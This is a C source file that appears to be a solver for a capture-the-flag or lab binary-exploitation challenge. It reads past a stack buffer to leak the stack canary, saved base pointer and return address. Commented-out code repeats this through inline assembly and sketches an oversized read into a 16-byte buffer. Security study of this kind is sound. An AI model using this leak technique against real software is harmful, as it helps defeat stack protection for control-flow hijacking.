#include <stdio.h>

typedef int (*printf_ptr_t)(const char *format, ...);

void solver(printf_ptr_t fptr) {
    // fptr("hello\n");
    char msg[16] = "hello world!";
    long long int base = (long long int)(&msg);
    fptr("%lx\n%lx\n%lx\n", *(long long int*)(base+0x18), *(long long int*)(base+0x20), *(long long int*)(base+0x28)); // canary rbp ra
    
    // long long int arg1, arg2, arg3;

    // asm("movq %1, %%rax\n\t"
    //     "addq $0x18, %%rax\n\t"
    //     "movq (%%rax), %0"
    //     : "=r"(arg1)
    //     : "r"(base)
    //     : "%rax");

    // asm("movq %1, %%rax\n\t"
    //     "addq $0x20, %%rax\n\t"
    //     "movq (%%rax), %0"
    //     : "=r"(arg2)
    //     : "r"(base)
    //     : "%rax");

    // asm("movq %1, %%rax\n\t"
    //     "addq $0x28, %%rax\n\t"
    //     "movq (%%rax), %0"
    //     : "=r"(arg3)
    //     : "r"(base)
    //     : "%rax");

    // asm("movq %0, %%rdi\n\t"
    //     "movq %1, %%rsi\n\t"
    //     "movq %2, %%rdx\n\t"
    //     "movq %3, %%rcx\n\t"
    //     "movq $0, %%rax\n\t"
    //     "call *%4"
    //     :
    //     : "r"("%llx\n%llx\n%llx\n"), "r"(arg1), "r"(arg2), "r"(arg3), "r"(fptr)
    //     : "%rdi", "%rsi", "%rdx", "%rcx", "%rax"
    // );






    // base += 0x8;
    // fptr("%llx\n", *(long long int*)base); // rbp
    // base += 0x8;
    // fptr("%llx\n", *(long long int*)base); // ra

    // long long int canary = *(long long int*)((long long int)(&msg)+0x018);
    // long long int rbp = *(long long int*)((long long int)(&msg)+0x020);
    // long long int ra = *(long long int*)((long long int)(&msg)+0x028);
    // fptr("canary: %llx\n", canary); // canary
    // fptr("rbp   : %llx\n", rbp); // rbp
    // fptr("ra    : %llx\n", ra); // ra
	
	// int val, sz;
	// fptr("Show me your answer? ");fflush(stdout);
	// if((sz = read(0, msg, 128)) < 0) errquit("guess/read");
	// fptr("** guess: %d byte(s) read\n", sz);fflush(stdout);
    // fptr("msg: %s\n", msg);fflush(stdout);
    // // if(sscanf(msg, "%d", &val) != 1) errquit("guess/sscanf");
    // int f;
    // if((f = sscanf(msg, "%d", &val)) != 1) {
    //     fptr("sscanf num: %d\n", f);
    //     errquit("guess/sscanf");
    // }
	// // return strtol(buf, NULL, 0);
    // canary = *(long long int*)((long long int)(&msg)+0x018);
    // rbp = *(long long int*)((long long int)(&msg)+0x020);
    // ra = *(long long int*)((long long int)(&msg)+0x028);
    // fptr("canary: %llx\n", canary); // canary
    // fptr("rbp: %llx\n", rbp); // rbp
    // fptr("ra: %llx\n", ra); // ra

    // fflush(stdout);
    // return;
}

int main() {
	char fmt[16] = "** main = %p\n";
	printf(fmt, main);
	solver(printf);
	return 0;
}